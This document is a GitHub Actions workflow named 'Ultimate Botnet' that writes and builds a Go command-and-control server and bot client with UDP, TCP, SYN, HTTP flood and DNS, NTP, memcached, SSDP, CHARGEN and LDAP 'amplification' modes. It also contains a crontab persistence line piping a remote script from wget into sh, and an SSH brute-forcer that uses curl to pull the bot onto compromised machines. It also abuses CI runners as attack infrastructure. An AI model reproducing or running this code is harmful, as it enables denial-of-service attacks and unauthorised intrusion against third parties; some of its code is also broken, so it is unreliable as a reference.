name: Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'

jobs:
  deploy-botnet:
    runs-on: ubuntu-latest
    timeout-minutes: 3600

    steps:
    - name: Setup Environment
      run: |
        mkdir -p botnet && cd botnet
        echo "Installing dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip nmap masscan
        pip3 install requests paramiko

    - name: Create Real CNC Server
      run: |
        cd botnet
        cat > cnc.go << 'EOF'
        package main

        import (
            "bufio"
            "crypto/tls"
            "fmt"
            "log"
            "math/rand"
            "net"
            "net/http"
            "os/exec"
            "strconv"
            "strings"
            "sync"
            "time"
        )

        var (
            bots   []net.Conn
            botMux sync.Mutex
        )

        func main() {
            go startUserServer()
            startBotServer()
        }

        func startUserServer() {
            listener, _ := net.Listen("tcp", ":5555")
            for {
                conn, _ := listener.Accept()
                go handleUser(conn)
            }
        }

        func startBotServer() {
            listener, _ := net.Listen("tcp", ":4444")
            log.Println("🚀 CNC Started - Ports 5555 (users) & 4444 (bots)")
            for {
                conn, _ := listener.Accept()
                botMux.Lock()
                bots = append(bots, conn)
                count := len(bots)
                botMux.Unlock()
                log.Printf("🤖 Bot Connected: %s (Total: %d)", conn.RemoteAddr(), count)
            }
        }

        func handleUser(conn net.Conn) {
            conn.Write([]byte("\033[1;35m\n  ██████  ██████  ████████ ███    ██ ███████ ████████ \n  ██    ██ ██   ██    ██    ████   ██ ██         ██    \n  ██    ██ ██████     ██    ██ ██  ██ █████      ██    \n  ██    ██ ██   ██    ██    ██  ██ ██ ██         ██    \n   ██████  ██   ██    ██    ██   ████ ███████    ██    \n\n\033[0m"))
            conn.Write([]byte("\033[1;36mUsername: \033[0m"))
            user, _ := bufio.NewReader(conn).ReadString('\n')
            conn.Write([]byte("\033[1;36mPassword: \033[0m"))
            pass, _ := bufio.NewReader(conn).ReadString('\n')

            if strings.TrimSpace(user) == "admin" && strings.TrimSpace(pass) == "admin" {
                conn.Write([]byte("\033[1;32mLogin Successful!\033[0m\n"))
                for {
                    conn.Write([]byte("\033[1;37mbotnet# \033[0m"))
                    cmd, _ := bufio.NewReader(conn).ReadString('\n')
                    parts := strings.Fields(cmd)
                    
                    if len(parts) == 0 { continue }
                    
                    switch parts[0] {
                    case "bots":
                        botMux.Lock()
                        conn.Write([]byte(fmt.Sprintf("\033[1;33mBots Online: %d\033[0m\n", len(bots))))
                        botMux.Unlock()
                    case "attack":
                        if len(parts) >= 5 {
                            botMux.Lock()
                            for _, bot := range bots {
                                bot.Write([]byte(strings.Join(parts[1:], " ") + "\n"))
                            }
                            botMux.Unlock()
                            conn.Write([]byte(fmt.Sprintf("\033[1;32mAttack Sent to %d Bots\033[0m\n", len(bots))))
                        }
                    case "methods":
                        conn.Write([]byte("\033[1;35mUDP | TCP | SYN | HTTP | DNS | NTP | MEMCACHED | SSDP | CHARGEN | LDAP\033[0m\n"))
                    case "kill":
                        os.Exit(0)
                    default:
                        conn.Write([]byte("\033[1;31mUnknown Command\033[0m\n"))
                    }
                }
            }
        }
        EOF

    - name: Create Advanced Bot Client
      run: |
        cd botnet
        cat > bot.go << 'EOF'
        package main

        import (
            "bufio"
            "crypto/tls"
            "fmt"
            "log"
            "math/rand"
            "net"
            "net/http"
            "os/exec"
            "runtime"
            "strconv"
            "strings"
            "time"
        )

        func main() {
            // Install persistence
            if runtime.GOOS == "linux" {
                exec.Command("sh", "-c", "echo '@reboot sleep 60 && wget -q -O - http://RAW_URL/bot | sh' | crontab -").Run()
            }
            
            for {
                conn, err := net.Dial("tcp", "CNC_IP:4444")
                if err == nil {
                    handleCNC(conn)
                }
                time.Sleep(10 * time.Second)
            }
        }

        func handleCNC(conn net.Conn) {
            defer conn.Close()
            scanner := bufio.NewScanner(conn)
            for scanner.Scan() {
                cmd := scanner.Text()
                parts := strings.Fields(cmd)
                if len(parts) < 4 { continue }
                
                method, target, portStr, durationStr := parts[0], parts[1], parts[2], parts[3]
                port, _ := strconv.Atoi(portStr)
                duration, _ := strconv.Atoi(durationStr)
                
                go launchAttack(method, target, port, duration)
            }
        }

        func launchAttack(method, target string, port, duration int) {
            end := time.Now().Add(time.Duration(duration) * time.Second)
            workers := 1000
            
            switch strings.ToUpper(method) {
            case "UDP":
                go udpFlood(target, port, end, workers)
            case "TCP":
                go tcpFlood(target, port, end, workers)
            case "SYN":
                go synFlood(target, port, end, workers)
            case "HTTP":
                go httpFlood(target, port, end, workers)
            case "DNS":
                go dnsAmplification(target, port, end)
            case "NTP":
                go ntpAmplification(target, port, end)
            case "MEMCACHED":
                go memcachedAmplification(target, port, end)
            case "SSDP":
                go ssdpAmplification(target, port, end)
            case "CHARGEN":
                go chargenAmplification(target, port, end)
            case "LDAP":
                go ldapAmplification(target, port, end)
            }
        }

        func udpFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                        if err == nil {
                            conn.Write(make([]byte, 65500))
                            conn.Close()
                        }
                    }
                }()
            }
        }

        func tcpFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
                        if err == nil {
                            for i := 0; i < 100 && time.Now().Before(end); i++ {
                                conn.Write(make([]byte, 1460))
                            }
                            conn.Close()
                        }
                    }
                }()
            }
        }

        func synFlood(target string, port int, end time.Time, workers int) {
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        net.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
                    }
                }()
            }
        }

        func httpFlood(target string, port int, end time.Time, workers int) {
            tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
            
            for i := 0; i < workers; i++ {
                go func() {
                    for time.Now().Before(end) {
                        go func() {
                            url := fmt.Sprintf("http://%s:%d/", target, port)
                            req, _ := http.NewRequest("GET", url, nil)
                            req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                            client.Do(req)
                        }()
                    }
                }()
            }
        }

        // Amplification Attacks
        func dnsAmplification(target string, port int, end time.Time) {
            payload := []byte{0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x69, 0x73, 0x63, 0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, 0x01, 0x00, 0x01}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ntpAmplification(target string, port int, end time.Time) {
            payload := []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func memcachedAmplification(target string, port int, end time.Time) {
            payload := []byte("\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ssdpAmplification(target string, port int, end time.Time) {
            payload := []byte("M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func chargenAmplification(target string, port int, end time.Time) {
            payload := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00}
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }

        func ldapAmplification(target string, port int, end time.Time) {
            payload := []byte("0\x84\x00\x00\x00-\x02\x01\x01c\x84\x00\x00\x00$\x04\x00\n\x01\x00\n\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass0\x84\x00\x00\x00\x00")
            for time.Now().Before(end) {
                conn, _ := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
                conn.Write(payload)
                conn.Close()
            }
        }
        EOF

    - name: Build Everything
      run: |
        cd botnet
        go build -o cnc cnc.go
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot.go
        GOOS=linux GOARCH=386 go build -o bot_x86 bot.go
        GOOS=linux GOARCH=arm64 go build -o bot_arm64 bot.go
        GOOS=linux GOARCH=arm GOARM=7 go build -o bot_arm7 bot.go

    - name: Setup Tailscale
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=botnet-${{ github.run_id }}
        echo "TAILSCALE_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Update Bot with Real IP
      run: |
        cd botnet
        sed -i "s/CNC_IP/${{ env.TAILSCALE_IP }}/g" bot.go
        go build -o bot bot.go

    - name: Start CNC Server
      run: |
        cd botnet
        nohup ./cnc > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        sleep 3

    - name: Deploy Bot Army
      run: |
        cd botnet
        
        case "${{ github.event.inputs.power }}" in
          "100mb") BOTS=50 ;;
          "1gb") BOTS=200 ;;
          "10gb") BOTS=500 ;;
          "100gb") BOTS=1000 ;;
          "1tb") BOTS=2000 ;;
        esac
        
        for i in $(seq 1 $BOTS); do
          nohup ./bot > /dev/null 2>&1 &
        done
        
        echo "BOTS_DEPLOYED=$BOTS" >> $GITHUB_ENV

    - name: Create Auto-Scanner
      run: |
        cd botnet
        cat > scanner.py << 'EOF'
        import socket
        import threading
        import paramiko
        import requests

        targets = []
        with open('targets.txt', 'r') as f:
            targets = [line.strip() for line in f]

        def brute_ssh(ip):
            creds = [('root','root'),('admin','admin'),('admin','password')]
            for user, passwd in creds:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=user, password=passwd, timeout=10)
                    print(f"[+] {ip} - {user}:{passwd}")
                    # Deploy bot
                    ssh.exec_command('curl http://${{ env.TAILSCALE_IP }}/bot_x64 -o /tmp/bot && chmod +x /tmp/bot && /tmp/bot &')
                    ssh.close()
                    return True
                except:
                    pass
            return False

        for target in targets:
            threading.Thread(target=brute_ssh, args=(target,)).start()
        EOF

    - name: Display Power Status
      run: |
        echo ""
        echo "╔══════════════════════════════════════════════════╗"
        echo "║                💀 ULTIMATE BOTNET 💀            ║"
        echo "╠══════════════════════════════════════════════════╣"
        echo "║  Power Level:    ${{ github.event.inputs.power }}"
        echo "║  CNC IP:         ${{ env.TAILSCALE_IP }}"
        echo "║  Bots Deployed:  ${{ env.BOTS_DEPLOYED }}"
        echo "║  User Port:      5555"
        echo "║  Bot Port:       4444"
        echo "╠══════════════════════════════════════════════════╣"
        echo "║  🔑 Login: admin / admin"
        echo "║  📡 Connect: telnet ${{ env.TAILSCALE_IP }} 5555"
        echo "║  ⚡ Methods: 10+ Real Attack Vectors"
        echo "║  🚀 Features: Auto-Scaling + Persistence"
        echo "╚══════════════════════════════════════════════════╝"
        echo ""

    - name: Keep Alive
      run: |
        while true; do
          # Restart if CNC dies
          if ! ps -p ${{ env.CNC_PID }} > /dev/null; then
            cd botnet && nohup ./cnc > cnc.log 2>&1 &
          fi
          
          # Deploy more bots if needed
          CURRENT_BOTS=$(ps aux | grep bot | grep -v grep | wc -l)
          if [ $CURRENT_BOTS -lt ${{ env.BOTS_DEPLOYED }} ]; then
            cd botnet
            for i in $(seq 1 10); do
              nohup ./bot > /dev/null 2>&1 &
            done
          fi
          
          echo "[$(date)] Active: $CURRENT_BOTS bots | CNC: ${{ env.TAILSCALE_IP }}"
          sleep 30
        done
